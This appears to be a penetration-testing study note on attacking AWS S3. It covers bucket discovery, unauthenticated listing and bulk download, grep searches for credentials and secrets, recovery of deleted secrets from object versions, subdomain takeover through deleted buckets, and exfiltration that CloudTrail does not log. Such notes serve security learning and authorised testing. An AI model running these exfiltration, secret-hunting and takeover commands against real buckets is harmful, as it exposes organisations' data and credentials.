# 01.4 — S3 Attacks

## What This Note Covers

Amazon S3 (Simple Storage Service) is the most commonly misconfigured AWS service and responsible for more data breaches than any other. This note covers bucket enumeration, public bucket discovery, ACL and policy misconfigurations, unauthenticated access, data exfiltration, and bucket takeover.

---

## What Is S3?

S3 is AWS's object storage service. You store **objects** (files) in **buckets** (containers). Buckets have globally unique names across all of AWS.

Access is controlled via:
- **Bucket ACLs** (legacy, per-object or per-bucket) — grant access to AWS accounts or "everyone"
- **Bucket policies** (resource-based IAM policies) — JSON, define who can do what
- **IAM policies** (identity-based) — on the calling user/role

A bucket can be accessed:
- Authenticated — via AWS credentials
- Unauthenticated (public) — if the ACL or policy explicitly allows it

## S3 Bucket Naming and Discovery

S3 bucket names are global and predictable. Companies often name buckets after their products, domains, or environments.

```bash
# Common naming patterns to try:
company-name
company-name-prod
company-name-dev
company-name-staging
company-name-backups
company-name-logs
company-name-data
company-name-assets
company-name-static
company-name-public
company-name-internal
www.company.com
api.company.com
```

### S3 URLs — Two Formats

```
# Path-style (older, being deprecated)
https://s3.amazonaws.com/BUCKET_NAME/object-key

# Virtual-hosted style (current)
https://BUCKET_NAME.s3.amazonaws.com/object-key
https://BUCKET_NAME.s3.REGION.amazonaws.com/object-key
```

### Automated Bucket Discovery

```bash
# Tool: S3Scanner — enumerate public buckets
pip3 install s3scanner
s3scanner scan --bucket-file wordlist.txt
s3scanner scan --bucket target-company-assets

# Tool: cloud_enum — multi-cloud asset discovery
git clone https://github.com/initstring/cloud_enum
python3 cloud_enum.py -k targetcompany

# Tool: Bucket Finder
ruby bucket_finder.rb wordlist.txt

# Manual — check if bucket exists and is public
aws s3 ls s3://BUCKET_NAME --no-sign-request
# Response: lists objects → public read enabled
# Response: "AccessDenied" → bucket exists but is private
# Response: "NoSuchBucket" → bucket doesn't exist
```

### DNS-Based Discovery

S3 buckets used as static websites or via CloudFront have DNS CNAMEs pointing to them. During subdomain enumeration, you'll find:

```bash
# CNAME chain: assets.company.com → company-assets.s3.amazonaws.com
# This reveals the bucket name
nslookup assets.company.com
dig assets.company.com CNAME

# Also check certificate transparency logs for subdomains
# https://crt.sh/?q=%.company.com
```

## Public Bucket Access

### Checking for Public Access

```bash
# List bucket contents without credentials
aws s3 ls s3://TARGET-BUCKET --no-sign-request

# Download all objects from a public bucket
aws s3 sync s3://TARGET-BUCKET ./local-output --no-sign-request

# Try accessing the bucket via HTTPS directly
curl https://TARGET-BUCKET.s3.amazonaws.com/
# If public: returns XML listing of objects (up to 1000)

# Try downloading a specific object
curl https://TARGET-BUCKET.s3.amazonaws.com/config.json
aws s3 cp s3://TARGET-BUCKET/config.json . --no-sign-request
```

### Types of Public Access Misconfigurations

**1. Public Bucket ACL (Block Public Access disabled)**

AWS introduced "Block Public Access" settings (4 toggles) to prevent accidental public exposure. When disabled:

```bash
# Check if Block Public Access is configured
aws s3api get-public-access-block --bucket TARGET-BUCKET

# If the settings are all "false", public ACLs and policies can work
{
    "PublicAccessBlockConfiguration": {
        "BlockPublicAcls": false,
        "IgnorePublicAcls": false,
        "BlockPublicPolicies": false,
        "RestrictPublicBuckets": false
    }
}
```

**2. Public Bucket Policy**

```json
// Bucket policy granting public read to everyone
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::TARGET-BUCKET/*"
}
```

**3. Public ACL on individual objects**

Objects can have their own ACL set to `public-read`. Even if the bucket is private, individual objects may be publicly accessible if their ACL was set incorrectly.

```bash
# Check an object's ACL
aws s3api get-object-acl \
  --bucket TARGET-BUCKET \
  --key path/to/object.txt
```

## Authenticated Enumeration (with Credentials)

With valid credentials (any AWS identity), you can enumerate buckets and try to access data.

```bash
# List all buckets in the account (requires s3:ListAllMyBuckets)
aws s3 ls

# List objects in a specific bucket
aws s3 ls s3://TARGET-BUCKET --recursive

# Get bucket policy
aws s3api get-bucket-policy --bucket TARGET-BUCKET

# Get bucket ACL
aws s3api get-bucket-acl --bucket TARGET-BUCKET

# Check encryption settings
aws s3api get-bucket-encryption --bucket TARGET-BUCKET

# Check logging settings (if access logging is off, your activity isn't logged)
aws s3api get-bucket-logging --bucket TARGET-BUCKET

# Check versioning (versioned buckets keep old versions of objects — may contain old secrets)
aws s3api get-bucket-versioning --bucket TARGET-BUCKET

# List all object versions (including deleted versions)
aws s3api list-object-versions --bucket TARGET-BUCKET
```

> [!tip] Check versioning for historical secrets
> If a bucket has versioning enabled and a secret was once stored there but deleted, the old version is still accessible. Check old versions of config files.

```bash
# Get a specific version of an object
aws s3api get-object \
  --bucket TARGET-BUCKET \
  --key config.json \
  --version-id VERSION_ID \
  output.json
```

## High-Value S3 Targets

When you have access to a bucket (public or authenticated), look for:

```bash
# Search for credential/secret files
aws s3 ls s3://TARGET-BUCKET --recursive | grep -iE \
  "\.env|credentials|secret|password|config|backup|dump|key|token|cert|pem|\.sql|\.bak"

# Download candidates
aws s3 cp s3://TARGET-BUCKET/.env . --no-sign-request
aws s3 cp s3://TARGET-BUCKET/database-backup.sql . --no-sign-request

# Search downloaded content
grep -riE "password|secret|api_key|aws_access|db_pass" ./bucket-contents/
```

Common high-value findings in S3:
- `.env` files with database credentials
- SSH private keys
- TLS/SSL certificates and private keys
- Database dumps (`.sql`, `.dump`)
- Application backups containing configuration
- CloudTrail log files (attacker activity in other services)
- Access logs (internal URLs, user tokens in request logs)
- Terraform state files (`terraform.tfstate`) — contain resource IDs, sometimes secrets

> [!danger] Terraform state files
> `terraform.tfstate` files stored in S3 are extremely high value. They contain the current state of all infrastructure including resource IDs, and sometimes plaintext passwords for RDS, secrets passed as variables, etc.

## Bucket Takeover

If a subdomain CNAME points to an S3 bucket that no longer exists, you can create a bucket with that name and serve content from it. This is a **subdomain takeover** via S3.

```bash
# Identify: dig assets.company.com CNAME
# Result: company-assets-old.s3.amazonaws.com

# Check if the bucket exists
aws s3 ls s3://company-assets-old --no-sign-request
# "NoSuchBucket" → the bucket was deleted but the DNS record remains

# Create the bucket in your own AWS account with the same name
aws s3api create-bucket \
  --bucket company-assets-old \
  --region us-east-1

# Make it public and serve malicious content
# Now assets.company.com points to your bucket
```

This can be used for XSS, phishing, cookie theft, CSP bypass, etc.

## S3 Cross-Account Access

S3 resource policies can grant access to other accounts. When combined with weak conditions, this leads to cross-account data exposure.

```bash
# Check if the bucket policy allows cross-account access
aws s3api get-bucket-policy --bucket TARGET-BUCKET | jq .Policy | jq .

# Look for: "Principal": {"AWS": "*"} or a specific external account ID
# If the policy allows s3:GetObject from any principal or external account
# → that account (or anyone) can read the data
```

## CloudTrail: S3 Logging Blind Spots

S3 data events (object-level access: GetObject, PutObject, DeleteObject) are **not** logged in CloudTrail by default. Only management events (creating/deleting buckets, changing policies) are logged.

This means: if data event logging isn't explicitly enabled, your S3 data exfiltration won't appear in CloudTrail.

```bash
# Check if data event logging is configured for a bucket
aws cloudtrail get-event-selectors --trail-name TRAIL_NAME

# Look for: DataResources with S3 bucket ARNs
# If absent: data events not logged → stealth exfiltration possible
```

## Quick Reference — S3 Attack Commands

```bash
# Discovery
s3scanner scan --bucket TARGET-BUCKET
aws s3 ls s3://TARGET-BUCKET --no-sign-request

# Enumerate (with credentials)
aws s3 ls                                # list all buckets
aws s3 ls s3://BUCKET --recursive        # list all objects
aws s3api get-bucket-policy --bucket BUCKET
aws s3api get-bucket-acl --bucket BUCKET
aws s3api get-bucket-versioning --bucket BUCKET
aws s3api get-bucket-logging --bucket BUCKET

# Exfiltrate
aws s3 sync s3://BUCKET ./output --no-sign-request
aws s3 cp s3://BUCKET/file.txt . --no-sign-request

# Check historical versions
aws s3api list-object-versions --bucket BUCKET
aws s3api get-object --bucket BUCKET --key KEY --version-id VID output.file

# Search for secrets
grep -riE "password|secret|api_key|aws_access" ./output/
```
